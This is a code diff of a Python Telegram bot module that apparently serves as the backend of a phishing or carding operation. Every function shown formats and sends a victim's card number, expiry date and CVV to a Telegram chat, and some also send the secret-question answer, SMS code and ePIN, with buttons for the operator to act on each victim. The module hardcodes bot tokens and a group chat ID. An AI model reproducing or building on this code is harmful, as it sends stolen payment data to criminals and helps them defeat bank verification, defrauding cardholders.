@@ -1,8 +1,7 @@
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
-import time
-API_TOKEN = '7032123911:AAHxZ3tLrb5A4e6P3KSS36z1O4W7a3SknrQ'
+API_TOKEN = '7032123911:AAGptO_2J8LrckiO4ezdiCluO2YtdsIJgI4'
 from telegram.error import TelegramError
-def send_buttons_message(CHAT_ID, card, date, cvv):
+def send_buttons_message(CHAT_ID, card, date, cvv, ID):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
@@ -15,17 +14,9 @@ def send_buttons_message(CHAT_ID, card, date, cvv):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    bot.send_message(chat_id=CHAT_ID, text=f'💳  `{card}`\n\n📅  `{date}`\n\n🔐  `{cvv}`', reply_markup=reply_markup, parse_mode='MarkdownV2')
-
+    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`', reply_markup=reply_markup, parse_mode='MarkdownV2')
     
-    while True:
-        with open('button_state.txt', 'r') as file:
-            content = file.read()
-            if len(content) > 0:
-                return True
-        time.sleep(1)
-
-def send_secret_question(CHAT_ID, card, date, cvv, question):
+def send_secret_question(CHAT_ID, card, date, cvv, question, ID):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
@@ -37,14 +28,9 @@ def send_secret_question(CHAT_ID, card, date, cvv, question):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    bot.send_message(chat_id=CHAT_ID, text=f'💳  `{card}`\n\n📅  `{date}`\n\n🔐 : `{cvv}`\n\n❓  `{question}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')
-    while True:
-        with open('button_state.txt', 'r') as file:
-            content = file.read()
-            if len(content) > 0:
-                return True
-        time.sleep(1)
-def send_sms(CHAT_ID, card, date, cvv, sms, epin):
+    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n❓  `{question}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')
+
+def send_sms(CHAT_ID, card, date, cvv, sms, epin, ID):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
@@ -57,13 +43,8 @@ def send_sms(CHAT_ID, card, date, cvv, sms, epin):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    bot.send_message(chat_id=CHAT_ID, text=f'💳  `{card}`\n\n📅  `{date}`\n\n🔐 : `{cvv}`\n\n💬 : `{sms}`\n\nePIN : `{epin}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')
-    while True:
-        with open('button_state.txt', 'r') as file:
-            content = file.read()
-            if len(content) > 0:
-                return True
-        time.sleep(1)
+    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}`\nePIN : `{epin}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')
+
 def ne_pizdabol(card, chat_id='-1002224737693'):
     try:
         bot = Bot(token=API_TOKEN)
